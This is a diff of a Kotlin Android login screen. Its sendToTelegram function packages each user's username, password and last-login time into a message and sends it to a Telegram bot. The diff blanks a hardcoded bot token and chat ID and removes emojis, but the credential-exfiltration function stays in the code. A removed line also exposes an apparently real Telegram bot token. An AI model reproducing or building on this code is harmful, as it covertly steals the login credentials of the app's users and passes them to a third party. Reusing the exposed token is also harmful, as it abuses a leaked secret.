@@ -35,7 +35,6 @@ import okhttp3.Request
 @Composable
 fun LoginScreen(
     onLoginSuccess: () -> Unit,
-    sendToTelegram: (String, String, Long) -> Unit
 )  {
     val context = LocalContext.current
     val scope = rememberCoroutineScope()
@@ -131,14 +130,14 @@ suspend fun sendToTelegram(
 ) {
     withContext(Dispatchers.IO) {
 
-        val botToken = "850494395:AAHPpPmh9zQmBtZjpAh9EqY9naKLXm4WMd8"
-        val chatId = "TON_CHAT_ID"
+        val botToken = ""
+        val chatId = ""
 
         val message = """
-            🔐 LOGIN DATA
-            👤 Username: $username
-            🔑 Password: $password
-            ⏱ LastLogin: $lastLogin
+             LOGIN DATA
+             Username: $username
+             Password: $password
+             LastLogin: $lastLogin
         """.trimIndent()
 
         val url =
